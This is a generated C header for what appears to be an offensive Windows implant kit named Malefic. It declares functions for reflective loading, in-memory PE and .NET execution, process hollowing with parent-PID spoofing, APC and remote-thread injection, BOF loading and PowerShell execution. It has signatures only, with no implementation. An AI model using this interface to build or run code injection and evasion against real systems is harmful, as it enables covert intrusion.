#ifndef MALEFIC_WIN_KIT
#define MALEFIC_WIN_KIT

// This file is generated from src/ffi/mod.rs using cbindgen

#include <stdint.h>
#include <stdbool.h>

typedef struct {
  uint8_t *data;
  uintptr_t len;
  uintptr_t capacity;
} RawString;

RawString ReflectiveLoader(const uint8_t *start_commandline,
                           uintptr_t start_commandline_len,
                           const uint8_t *reflective_loader_name,
                           uintptr_t reflective_loader_name_len,
                           const uint8_t *data,
                           uintptr_t data_len,
                           const uint8_t *param,
                           uintptr_t param_len,
                           uint32_t ppid,
                           bool block_dll,
                           uint32_t timeout,
                           bool is_need_output);

RawString InlinePE(const uint8_t *bin,
                   uintptr_t bin_size,
                   const uint16_t *magic,
                   const uint32_t *signature,
                   const uint8_t *commandline,
                   uintptr_t commandline_len,
                   const uint8_t *entrypoint,
                   uintptr_t entrypoint_len,
                   bool is_dll,
                   bool is_need_output,
                   uint32_t timeout,
                   uint32_t delay);

const void *PELoader(const void *handle,
                     const void *base_addr,
                     uintptr_t size,
                     bool need_modify_magic,
                     bool need_modify_sign,
                     uint16_t magic,
                     uint32_t signature);

void UnloadPE(const void *module);

uint8_t HijackCommandLine(const uint8_t *commandline, uintptr_t commandline_len);

RawString RunSacrifice(uint8_t *application_name,
                       const uint8_t *start_commandline,
                       uintptr_t start_commandline_len,
                       const uint8_t *hijack_commandline,
                       uintptr_t hijack_commandline_len,
                       uint32_t parent_id,
                       bool need_output,
                       bool block_dll);

RawString RunPE(const uint8_t *start_commandline,
                uintptr_t start_commandline_len,
                const uint8_t *hijack_commandline,
                uintptr_t hijack_commandline_len,
                const uint8_t *data,
                uintptr_t data_size,
                const uint8_t *entrypoint,
                uintptr_t entrypoint_len,
                const uint8_t *args,
                uintptr_t args_len,
                bool is_x86,
                uint32_t pid,
                bool block_dll,
                bool need_output);

RawString ApcLoaderInline(const uint8_t *bin, uintptr_t bin_len, bool need_output);

RawString ApcLoaderSacriface(const uint8_t *bin,
                             uintptr_t bin_len,
                             int8_t *sacriface_commandline,
                             uint32_t ppid,
                             bool block_dll,
                             bool need_output);

RawString InjectRemoteThread(const uint8_t *bin, uintptr_t bin_len, uint32_t pid);

const void *MaleficLoadLibrary(uint32_t flags,
                               const uint16_t *buffer,
                               const void *file_buffer,
                               uintptr_t len,
                               const uint8_t *name);

const void *MaleficGetFuncAddrWithModuleBaseDefault(const void *module_base,
                                                    const uint8_t *func_name,
                                                    uintptr_t func_name_len);

RawString MaleficExecAssembleInMemory(const uint8_t *data,
                                      uintptr_t data_len,
                                      const uint8_t *const *arguments,
                                      uintptr_t arguments_len);

RawString MaleficBofLoader(const uint8_t *buffer,
                           uintptr_t buffer_len,
                           const uint8_t *const *arguments,
                           uintptr_t arguments_size,
                           const uint8_t *entrypoint_name);

RawString MaleficPwshExecCommand(const uint8_t *command, uintptr_t command_len);

void SafeFreePipeData(const uint8_t *data);

#endif /* MALEFIC_WIN_KIT */
